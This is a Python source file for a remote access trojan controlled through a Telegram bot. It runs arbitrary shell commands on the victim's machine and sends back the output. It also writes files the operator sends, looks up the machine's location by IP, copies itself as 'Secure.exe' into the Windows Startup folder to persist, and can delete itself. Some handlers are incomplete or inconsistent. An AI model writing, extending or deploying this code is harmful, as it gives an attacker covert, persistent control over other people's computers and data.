import telebot
import os
import subprocess
import requests
from getpass import getuser
import shutil

# Telegram bot token
TELEGRAM_TOKEN = "YOUR_TELEGRAM_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

# Variable to track shell command execution status
execute_shell = True

# Function to send a message to the Telegram bot
def send_message(message):
    bot = telebot.TeleBot(TELEGRAM_TOKEN)
    bot.send_message(CHAT_ID, message)

# Function to handle incoming commands from the Telegram bot
def handle_command(command):
    global execute_shell

    if command.lower() == "exit":
        send_message("🏴‍☠Server is shutting down...🏴‍☠")
        exit(0)
    elif command.lower() == "help":
        available_commands = [
            "/help - Show available commands",
            "/exit - Shut down the server",
            "/download <file_path> - Send a file to the bot",
            "/upload - Receive a file from the bot and upload it",
            "/shell <command> - Execute a shell command",
            "/shelloff - Stop executing shell commands",
            "/location - Get the location of the target machine",
            "/destroy - Remove the bot"
        ]
        command_list = "\n".join(available_commands)
        send_message(f"🛑Available commands:\n{command_list}")
    elif command.lower() == "download":
        send_message("🌐Please provide the file path to download.🌐")
    elif command.lower().startswith("upload"):
        send_message("🌐Please upload the file to upload.🌐")
    elif command.lower().startswith("shell"):
        shell_command = command.lower().split(" ", 1)[-1].strip()
        if execute_shell:
            try:
                result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8')
                send_message(result)
            except subprocess.CalledProcessError as e:
                send_message(f"🆘Command execution failed with error: {e.output}")
        else:
            send_message("🕷️Shell commands are currently disabled. Use /shelloff to enable them.🕷️")
    elif command.lower() == "shelloff":
        execute_shell = False
        send_message("🕷️Shell commands are now disabled.🕷️")
    elif command.lower() == "location":
        location = get_location()
        send_message(location)
    elif command.lower() == "destroy":
        send_message("🕷️Bot self-destruct sequence initiated...🕷️")
        bot.stop_polling()
        bot.remove_webhook()
        send_message("🏴Bot has been destroyed.🏴")
        os.remove("Secure.exe")
    else:
        send_message("⚠Invalid command⚠")

# Function to handle incoming messages from the Telegram bot
def handle_message(message):
    if message.startswith('/'):
        command = message[1:]
        handle_command(command)
    else:
        send_message("⚠Invalid command⚠")

# Function to get the location of the target machine
def get_location():
    # Use an IP Geolocation API to obtain the location information
    response = requests.get("https://ipgeolocationapi.com/json/")
    data = response.json()
    location = f"Location:\nIP: {data['ip']}\nCity: {data['city']}\nRegion: {data['region']}\nCountry: {data['country_name']}"
    return location

# Start the Telegram bot
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# Handler for incoming messages
@bot.message_handler(content_types=['document'])
def handle_incoming_message(message):
    if message.document:
        file_info = bot.get_file(message.document.file_id)
        file_path = file_info.file_path
        downloaded_file = bot.download_file(file_path)

        # Specify the path where you want to save the received file
        upload_path = message.caption.strip()

        with open(upload_path, 'wb') as file:
            file.write(downloaded_file)

        send_message(f"🕵File uploaded to {upload_path}")
    else:
        handle_message(message.text)

# Send the greeting message
send_message("🕵Hello! Sir, Your Agent Is Started Successfully🕵")

# Send the current working directory
send_message("🏴‍☠️Current working directory: " + os.getcwd())

# Copy the script to the Windows startup folder
user_name = getuser()
startup = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
copy_command = f"copy \"Secure.exe\" \"{startup}\""

copy_result = os.system(copy_command)

if copy_result == 0:
    send_message("🏴‍☠️Bot has been successfully copied to the startup folder.🏴‍☠️")
    startup_path = os.path.join(startup, "Secure.exe")
    if os.path.exists(startup_path):
        send_message(" 🏴‍☠️I am in the Startup folder.🏴‍☠️")
    else:
        send_message("🏴‍☠️I am not in the Startup folder.🏴‍☠️")
else:
    send_message("🛑Failed to copy the bot to thestartup folder.🛑")

# Start the bot
bot.polling()
